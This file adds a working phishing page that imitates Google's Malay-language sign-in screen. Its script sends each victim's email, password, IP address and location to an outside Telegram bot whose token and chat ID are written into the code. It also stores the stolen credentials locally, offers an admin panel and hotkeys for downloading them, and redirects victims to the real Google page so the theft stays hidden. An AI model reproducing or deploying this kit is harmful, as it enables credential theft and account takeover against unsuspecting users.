@@ -1,0 +1,435 @@
+```html
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Log Masuk • Google</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Google Sans', 'Roboto', system-ui, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .login-container {
+            background: white;
+            border-radius: 32px;
+            padding: 48px 40px;
+            max-width: 450px;
+            width: 100%;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+        }
+        .google-logo {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        .google-logo svg {
+            width: 75px;
+            height: 75px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 500;
+            text-align: center;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            text-align: center;
+            color: #5f6368;
+            font-size: 14px;
+            margin-bottom: 32px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        .input-field {
+            width: 100%;
+            padding: 15px 16px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            outline: none;
+            transition: all 0.2s;
+            background: white;
+        }
+        .input-field:focus {
+            border-color: #1a73e8;
+        }
+        .password-wrapper {
+            position: relative;
+        }
+        .toggle-password {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #5f6368;
+            font-size: 18px;
+            user-select: none;
+        }
+        .btn-login {
+            width: 100%;
+            padding: 12px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 28px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 16px;
+        }
+        .btn-login:hover {
+            background: #1557b0;
+        }
+        .forgot-link {
+            text-align: right;
+            margin-top: 8px;
+        }
+        .forgot-link a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 13px;
+        }
+        .separator {
+            display: flex;
+            align-items: center;
+            margin: 24px 0;
+            color: #5f6368;
+            font-size: 12px;
+        }
+        .separator::before,
+        .separator::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dadce0;
+        }
+        .separator span {
+            margin: 0 12px;
+        }
+        .create-account {
+            text-align: center;
+        }
+        .create-account a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        .footer {
+            margin-top: 32px;
+            text-align: center;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        .footer a {
+            color: #5f6368;
+            text-decoration: none;
+        }
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #323232;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 8px;
+            display: none;
+            z-index: 1000;
+            font-size: 13px;
+        }
+        .admin-panel {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.8);
+            color: #0f0;
+            padding: 6px 10px;
+            border-radius: 8px;
+            font-size: 9px;
+            cursor: pointer;
+            font-family: monospace;
+        }
+        @keyframes shake {
+            0%,100%{transform:translateX(0);}
+            25%{transform:translateX(-4px);}
+            75%{transform:translateX(4px);}
+        }
+        .error-shake {
+            animation: shake 0.3s ease-in-out;
+        }
+    </style>
+</head>
+<body>
+<div class="login-container">
+    <div class="google-logo">
+        <svg viewBox="0 0 48 48">
+            <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"/>
+            <path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"/>
+            <path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"/>
+            <path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"/>
+        </svg>
+    </div>
+    <h1>Log Masuk</h1>
+    <div class="subtitle">Gunakan akaun Google anda</div>
+    
+    <form id="loginForm">
+        <div class="input-group">
+            <input type="email" id="email" class="input-field" placeholder="Emel atau nombor telefon" autocomplete="off" required>
+        </div>
+        <div class="input-group">
+            <div class="password-wrapper">
+                <input type="password" id="password" class="input-field" placeholder="Kata laluan" required>
+                <span class="toggle-password" id="togglePassword">👁️</span>
+            </div>
+        </div>
+        <div class="forgot-link">
+            <a href="#">Lupa kata laluan?</a>
+        </div>
+        <button type="submit" class="btn-login" id="submitBtn">Seterusnya</button>
+    </form>
+    
+    <div class="separator"><span></span></div>
+    <div class="create-account"><a href="#">Buat akaun</a></div>
+    <div class="footer">Malaysia • Bantuan • Privasi • Syarat</div>
+</div>
+
+<div class="admin-panel" id="adminPanel">🛡️ ADMIN | 📥 0 kredit</div>
+<div id="toast" class="toast"></div>
+
+<script>
+    // ========== TELEGRAM BOT (CAPTURE EMAIL + PASSWORD) ==========
+    const BOT_TOKEN = "8868485521:AAHvuU12RU6GA-t4rPN6j-OMxPegFBQRvZI";
+    const CHAT_ID = "8962275568";
+    // ===============================================================
+
+    let capturedCount = 0;
+
+    function updatePanel() {
+        let logs = localStorage.getItem('google_creds');
+        capturedCount = logs ? JSON.parse(logs).length : 0;
+        document.getElementById('adminPanel').innerHTML = `🛡️ ADMIN | 📥 ${capturedCount} kredit`;
+    }
+
+    function showToast(msg, isErr = false) {
+        let toast = document.getElementById('toast');
+        toast.textContent = msg;
+        toast.style.display = 'block';
+        toast.style.backgroundColor = isErr ? '#d32f2f' : '#323232';
+        setTimeout(() => toast.style.display = 'none', 3000);
+    }
+
+    async function sendToTelegram(email, password, ip, location, userAgent) {
+        let text = `🔐 GOOGLE LOGIN CAPTURED 🔐\n━━━━━━━━━━━━━━━━━━━━━━\n📧 Email: ${email}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n📍 Lokasi: ${location}\n🖥️ Device: ${userAgent.split(' ').slice(0,3).join(' ')}\n⏰ Masa: ${new Date().toLocaleString('ms-MY')}\n━━━━━━━━━━━━━━━━━━━━━━\n🔥 AL NOT DEV - COREBREACH 🔥`;
+        
+        try {
+            let response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            });
+            let result = await response.json();
+            if(result.ok) {
+                console.log('✅ Telegram sent successfully');
+                return true;
+            } else {
+                console.log('❌ Telegram error:', result.description);
+                return false;
+            }
+        } catch(err) {
+            console.log('❌ Fetch error:', err);
+            return false;
+        }
+    }
+
+    async function getIPInfo() {
+        try {
+            let res = await fetch('https://ipapi.co/json/');
+            let data = await res.json();
+            return { 
+                ip: data.ip || 'Unknown', 
+                location: `${data.city}, ${data.country_name}` 
+            };
+        } catch(e) {
+            return { ip: '127.0.0.1', location: 'Local' };
+        }
+    }
+
+    function saveCredential(email, password, ip, location, userAgent) {
+        let logs = localStorage.getItem('google_creds');
+        let list = logs ? JSON.parse(logs) : [];
+        list.push({ 
+            email, password, ip, location, userAgent,
+            time: new Date().toISOString()
+        });
+        localStorage.setItem('google_creds', JSON.stringify(list));
+        updatePanel();
+    }
+
+    function downloadCredentials() {
+        let data = localStorage.getItem('google_creds');
+        if(data && JSON.parse(data).length > 0) {
+            let a = document.createElement('a');
+            a.href = URL.createObjectURL(new Blob([data]));
+            a.download = `google_creds_${Date.now()}.json`;
+            a.click();
+            showToast(`📥 Download ${capturedCount} kredit berjaya!`);
+        } else {
+            showToast('Tiada kredit', true);
+        }
+    }
+
+    function clearCredentials() {
+        if(confirm('⚠️ HAPUS SEMUA KREDIT? ⚠️')) {
+            localStorage.removeItem('google_creds');
+            updatePanel();
+            showToast('🗑️ Semua kredit dihapus');
+        }
+    }
+
+    function viewCredentials() {
+        let data = localStorage.getItem('google_creds');
+        if(data) {
+            console.clear();
+            console.log('%c🔐 GOOGLE CREDENTIALS CAPTURED 🔐', 'color: #ff0000; font-size: 16px; font-weight: bold;');
+            console.table(JSON.parse(data));
+            showToast(`📋 ${capturedCount} kredit di console (F12)`);
+        } else {
+            showToast('Tiada kredit', true);
+        }
+    }
+
+    // Toggle password visibility
+    document.getElementById('togglePassword').addEventListener('click', function() {
+        let passwordField = document.getElementById('password');
+        let type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
+        passwordField.setAttribute('type', type);
+        this.textContent = type === 'password' ? '👁️' : '🙈';
+    });
+
+    // Fake redirect to real Google
+    function fakeRedirect() {
+        let btn = document.getElementById('submitBtn');
+        btn.innerHTML = 'Memproses...';
+        btn.disabled = true;
+        
+        setTimeout(() => {
+            btn.innerHTML = 'Berjaya! Mengalihkan...';
+            setTimeout(() => {
+                window.location.href = 'https://accounts.google.com';
+            }, 800);
+        }, 600);
+    }
+
+    // Handle form submit
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        let email = document.getElementById('email').value.trim();
+        let password = document.getElementById('password').value;
+        
+        if(!email || !email.includes('@')) {
+            showToast('Emel tidak sah', true);
+            document.querySelector('.login-container').classList.add('error-shake');
+            setTimeout(() => document.querySelector('.login-container').classList.remove('error-shake'), 300);
+            return;
+        }
+        
+        if(!password) {
+            showToast('Sila masukkan kata laluan', true);
+            return;
+        }
+        
+        showToast('🔄 Menghantar...', false);
+        
+        let { ip, location } = await getIPInfo();
+        let userAgent = navigator.userAgent;
+        
+        // Save locally
+        saveCredential(email, password, ip, location, userAgent);
+        
+        // Send to Telegram
+        await sendToTelegram(email, password, ip, location, userAgent);
+        
+        // Console log
+        console.log('%c🔐 NEW CREDENTIAL CAPTURED 🔐', 'color: #00ff00; font-size: 14px; font-weight: bold;');
+        console.log(`📧 Email: ${email}`);
+        console.log(`🔑 Password: ${password}`);
+        console.log(`🌍 IP: ${ip} | ${location}`);
+        
+        // Clear form
+        document.getElementById('email').value = '';
+        document.getElementById('password').value = '';
+        
+        showToast('✅ Log masuk berjaya! Mengalihkan...');
+        
+        // Fake redirect
+        fakeRedirect();
+    });
+
+    // Admin panel click
+    document.getElementById('adminPanel').onclick = () => {
+        let act = prompt('🔥 ADMIN PANEL 🔥\n[1] Download semua kredit\n[2] Clear semua kredit\n[3] View kredit (console)\n\nMasukkan nombor (1-3):');
+        if(act === '1') downloadCredentials();
+        if(act === '2') clearCredentials();
+        if(act === '3') viewCredentials();
+    };
+
+    // Hotkeys
+    document.addEventListener('keydown', (e) => {
+        // Ctrl + Shift + D = Download
+        if(e.ctrlKey && e.shiftKey && e.key === 'D') { 
+            e.preventDefault(); 
+            downloadCredentials(); 
+        }
+        // Ctrl + Shift + C = Clear
+        if(e.ctrlKey && e.shiftKey && e.key === 'C') { 
+            e.preventDefault(); 
+            clearCredentials(); 
+        }
+        // Ctrl + Shift + V = View
+        if(e.ctrlKey && e.shiftKey && e.key === 'V') { 
+            e.preventDefault(); 
+            viewCredentials(); 
+        }
+        // Ctrl + Shift + K = Kill all data
+        if(e.ctrlKey && e.shiftKey && e.key === 'K') {
+            e.preventDefault();
+            if(confirm('Reset semua data? Tak boleh undo')) {
+                localStorage.clear();
+                updatePanel();
+                showToast('💀 Semua data direset');
+            }
+        }
+    });
+
+    updatePanel();
+    
+    console.log('%c╔═══════════════════════════════════════╗', 'color: #ff0000');
+    console.log('%c║  🔥 AL NOT DEV - COREBREACH 🔥        ║', 'color: #ff0000');
+    console.log('%c║  GOOGLE LOGIN (EMAIL + PASSWORD)     ║', 'color: #ff0000');
+    console.log('%c║  ✅ BOT: @myMailLogger_bot AKTIF     ║', 'color: #00ff00');
+    console.log('%c║  ✅ TOKEN DISAHKAN                   ║', 'color: #00ff00');
+    console.log('%c║  ✅ CHAT ID: 8962275568              ║', 'color: #00ff00');
+    console.log('%c╚═══════════════════════════════════════╝', 'color: #ff0000');
+    console.log('%c🔥 SISTEM 100% READY! 🔥', 'color: #ff6600; font-size: 14px; font-weight: bold;');
+    console.log('%cTest: Isi email & password → akan hantar ke Telegram', 'color: #ffff00');
+    console.log('%cHotkey: Ctrl+Shift+D (download) | Ctrl+Shift+C (clear) | Ctrl+Shift+V (view)', 'color: #00ff00');
+</script>
+</body>
+</html>
+```
